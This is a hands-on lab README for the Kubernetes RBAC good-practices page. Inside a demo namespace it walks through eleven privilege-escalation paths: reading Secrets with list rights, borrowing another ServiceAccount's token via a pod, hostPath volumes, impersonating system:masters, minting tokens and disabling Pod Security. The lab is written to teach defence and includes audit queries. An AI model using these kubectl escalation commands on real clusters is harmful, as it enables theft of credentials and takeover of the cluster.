# Role Based Access Control Good Practices – Hands-on Lab

Based on: https://kubernetes.io/docs/concepts/security/rbac-good-practices/

> The page lists **privilege-escalation paths** that look harmless in a Role. This lab proves each one: a ServiceAccount `attacker` gets exactly **one** permission at a time ([grant.sh](grant.sh)) and uses it. [as-attacker.sh](as-attacker.sh) runs kubectl with **only** the attacker's token. `--as` on your admin kubeconfig would make *you* the impersonator.

## Key ideas (read first)

| Good practice | Meaning |
|---|---|
| **Least privilege** | Namespaced Roles over ClusterRoles. No wildcards. Avoid `cluster-admin`. Don't add users to `system:masters`: it **bypasses RBAC** and can't be revoked by removing bindings. |
| **Minimise privileged tokens** | Keep powerful SAs off nodes and Pods that don't need them. `automountServiceAccountToken: false`. Separate nodes for privileged workloads. |
| **Hardening** | Review `system:unauthenticated` bindings. Disable automounting on `default` SAs. |
| **Periodic review** | Remove stale bindings: a re-created user or SA with the same name **inherits** old ones. |
| **DoS** | Anyone who can create objects can fill etcd. Use **ResourceQuota** with `count/<resource>`. |

---

## Step 1
```bash
cd concepts/security/rbac-good-practices
kubectl apply -f 00-setup.yaml     # rbac-demo (PSA baseline), Secret db-password, SA ci-deployer (edit), SA attacker (nothing)
A="--as=system:serviceaccount:rbac-demo:attacker" ; N="-n rbac-demo"
```

## The escalation paths, measured
| # | Grant | Abuse | Result |
|---|---|---|---|
| 1 | `secrets: list` (no `get`) | `kubectl get secret db-password` → Forbidden … but `kubectl get secrets -o jsonpath='{..data.password}'` | **`hunter2`**: list returns full contents |
| 2 | `pods: create` | Pod with `serviceAccountName: ci-deployer` printing its token | token belongs to `system:serviceaccount:rbac-demo:ci-deployer` (edit rights, borrowed) |
| 3 | `persistentvolumes: create` | PV with `hostPath: /etc/kubernetes` | `persistentvolume/sneaky-pv created`: a claim on it would mount node files |
| 4 | `nodes/proxy: get` | `kubectl get --raw /api/v1/nodes/minikube/proxy/pods` | the kubelet lists all 15 Pods incl. kube-system, and serves container logs. Kubelet calls skip admission and are audited only as a proxy request. |
| 5 | `roles: create` | create a Role granting `secrets: get` | **Forbidden**: "attempting to grant RBAC permissions not currently held". **With `escalate`** → `role/all-secrets created` |
| 6 | `rolebindings: create` | bind ClusterRole `admin` to itself | **Forbidden** (the message lists all of `admin`'s rules). **With `bind` on `admin`** → created, and `can-i delete secrets` = **yes** |
| 7 | `users, groups: impersonate` | `as-attacker.sh get secrets -n kube-system --as=whoever --as-group=system:masters` | without the grant: Forbidden. With it: **No resources found in kube-system** (allowed, cluster-admin) |
| 8 | CSR `create` + `approval` + signer `approve` | issue client certs for any identity | `O=system:masters` → **refused**: "use of kubernetes.io/kube-apiserver-client signer with system:masters group is not allowed". `CN=kubernetes-admin/O=kubeadm:cluster-admins` → **issued** |
| 9 | `serviceaccounts/token: create` | `create token ci-deployer` | a token for `system:serviceaccount:rbac-demo:ci-deployer` |
| 10 | admission webhook objects | (not run) register a webhook to read or mutate every object | read every Secret written, inject sidecars… |
| 11 | `namespaces: patch` | `label ns rbac-demo pod-security.kubernetes.io/enforce=privileged` | PSA switched off for the namespace |

Commands for each row:
```bash
./grant.sh ns '{"apiGroups":[""],"resources":["secrets"],"verbs":["list"]}'
kubectl get secrets $N $A -o jsonpath='{.items[?(@.metadata.name=="db-password")].data.password}' | base64 -d     # 1
./grant.sh ns '{"apiGroups":[""],"resources":["pods","pods/log"],"verbs":["create","get"]}'
kubectl run borrow $N $A --image=busybox:1.36 --restart=Never --overrides='{"spec":{"serviceAccountName":"ci-deployer","containers":[{"name":"borrow","image":"busybox:1.36","command":["sh","-c","cut -d. -f2 /var/run/secrets/kubernetes.io/serviceaccount/token"]}]}}'   # 2
./grant.sh cluster '{"apiGroups":[""],"resources":["persistentvolumes"],"verbs":["create"]}'          # 3 (then create a hostPath PV with $A)
./grant.sh cluster '{"apiGroups":[""],"resources":["nodes/proxy"],"verbs":["get"]}'
kubectl get --raw /api/v1/nodes/minikube/proxy/pods $A | jq '.items|length'                          # 4
./grant.sh ns '{"apiGroups":["rbac.authorization.k8s.io"],"resources":["roles"],"verbs":["create","escalate"]}'      # 5
./grant.sh ns '{"apiGroups":["rbac.authorization.k8s.io"],"resources":["rolebindings"],"verbs":["create"]},{"apiGroups":["rbac.authorization.k8s.io"],"resources":["clusterroles"],"verbs":["bind"],"resourceNames":["admin"]}'
kubectl create rolebinding steal $N $A --clusterrole=admin --serviceaccount=rbac-demo:attacker      # 6
./grant.sh cluster '{"apiGroups":[""],"resources":["users","groups"],"verbs":["impersonate"]}'
./as-attacker.sh get secrets -n kube-system --as=whoever --as-group=system:masters                   # 7
./grant.sh ns '{"apiGroups":[""],"resources":["serviceaccounts/token"],"verbs":["create"]}'
./as-attacker.sh create token ci-deployer -n rbac-demo                                               # 9
./grant.sh cluster '{"apiGroups":[""],"resources":["namespaces"],"verbs":["get","patch"]}'
./as-attacker.sh label ns rbac-demo pod-security.kubernetes.io/enforce=privileged --overwrite        # 11
```
Note row 6: RBAC lets you bind a role only if you **already hold** its permissions, **or** have `bind` on it. Rows 5–6 show that the guard works and exactly which verb removes it.

## Denial of service
```bash
kubectl create quota objects $N --hard=count/configmaps=5
for i in 1 2 3 4 5 6; do kubectl create cm c$i $N; done
#   c5, c6: exceeded quota: objects, requested: count/configmaps=1, used: count/configmaps=5   <- kube-root-ca.crt counts too
```

---

## Useful commands
```bash
kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa> -n <ns>
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .metadata.name + ": " + ([.subjects[]?.name]|join(","))'
kubectl get roles,clusterroles -A -o json | jq -r '.items[] | select(any(.rules[]?; (.verbs|index("escalate","bind","impersonate")) or (.resources|index("nodes/proxy","serviceaccounts/token")))) | .metadata.name'
```

## Cleanup
```bash
./cleanup.sh
```
